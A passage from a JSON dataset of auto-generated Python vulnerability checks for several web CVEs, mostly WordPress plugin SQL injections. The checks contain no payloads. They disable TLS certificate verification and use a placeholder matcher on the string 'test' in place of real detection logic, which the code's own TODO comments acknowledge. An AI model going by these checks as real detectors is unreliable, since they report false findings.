          result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=7; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"NotificationX Dropshipping < 4.4 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2022_3481(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2022-3481"
        ],
        "tags": [
          "cve",
          "cve2022",
          "wordpress",
          "wp-plugin",
          "wp",
          "sqli",
          "woocommerce",
          "notificationx",
          "vkev",
          "vuln"
        ],
        "cvss_score": 4.3
      },
      {
        "id": "fn_nuclei_c_v_e_2023_3197",
        "name": "WordPress MStore API <= 4.0.1 - Unauthenticated SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "MStore API plugin for WordPress up to version 4.0.1 contains an unauthenticated blind SQL injection caused by insufficient escaping of 'id' parameter in SQL queries, letting attackers execute arbitrary SQL commands without authentication, exploit requires sending crafted requests with malicious 'id' parameter.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains_all(body,\"has_children\",\"display\") / [OR] DSL: duration >= 6; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2023-3197\nName: WordPress MStore API <= 4.0.1 - Unauthenticated SQL Injection\nSeverity: critical\nDescription: MStore API plugin for WordPress up to version 4.0.1 contains an unauthenticated blind SQL injection caused by insufficient escaping of 'id' parameter in SQL queries, letting attackers execute arbitrary SQL commands without authentication, exploit requires sending crafted requests with malicious 'id' parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2023_3197:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2023-3197\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress MStore API <= 4.0.1 - Unauthenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains_all(body,\"has_children\",\"display\") / [OR] DSL: duration >= 6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress MStore API <= 4.0.1 - Unauthenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2023_3197(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2023-3197\nName: WordPress MStore API <= 4.0.1 - Unauthenticated SQL Injection\nSeverity: critical\nDescription: MStore API plugin for WordPress up to version 4.0.1 contains an unauthenticated blind SQL injection caused by insufficient escaping of 'id' parameter in SQL queries, letting attackers execute arbitrary SQL commands without authentication, exploit requires sending crafted requests with malicious 'id' parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2023_3197:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2023-3197\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress MStore API <= 4.0.1 - Unauthenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains_all(body,\"has_children\",\"display\") / [OR] DSL: duration >= 6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress MStore API <= 4.0.1 - Unauthenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2023_3197(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2023",
          "wordpress",
          "wp-plugin",
          "wp",
          "sqli",
          "mstore-api",
          "wp",
          "unauth",
          "time-based"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2023_4450",
        "name": "JeecgBoot JimuReport - Template injection",
        "language": "Python",
        "famille": "CVE",
        "description": "A vulnerability was found in jeecgboot JimuReport up to 1.6.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the component Template Handler. The manipulation leads to injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(interactsh_protocol, \"http\") || contains(interactsh_protocol, \"dns\"); status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2023-4450\nName: JeecgBoot JimuReport - Template injection\nSeverity: critical\nDescription: A vulnerability was found in jeecgboot JimuReport up to 1.6.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the component Template Handler. The manipulation leads to injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2023_4450:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2023-4450\"\n    SEVERITY = \"critical\"\n    NAME = \"JeecgBoot JimuReport - Template injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(interactsh_protocol, \"http\") || contains(interactsh_protocol, \"dns\"); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"JeecgBoot JimuReport - Template injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2023_4450(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2023-4450\nName: JeecgBoot JimuReport - Template injection\nSeverity: critical\nDescription: A vulnerability was found in jeecgboot JimuReport up to 1.6.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the component Template Handler. The manipulation leads to injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2023_4450:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2023-4450\"\n    SEVERITY = \"critical\"\n    NAME = \"JeecgBoot JimuReport - Template injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(interactsh_protocol, \"http\") || contains(interactsh_protocol, \"dns\"); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"JeecgBoot JimuReport - Template injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2023_4450(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2023",
          "rce",
          "jeecgboot",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_0705",
        "name": "Stripe Payment Plugin for WooCommerce <= 3.7.9 - Unauthenticated SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "Stripe Payment Plugin for WooCommerce for WordPress versions up to 3.7.9 contains a sql_injection caused by insufficient escaping and lack of preparation on 'id' parameter, letting unauthenticated attackers execute arbitrary SQL queries, exploit requires sending crafted 'id' parameter.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(body, \"payment-gateway-stripe\"); status_code == 200 / [OR] DSL: duration >= 6; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
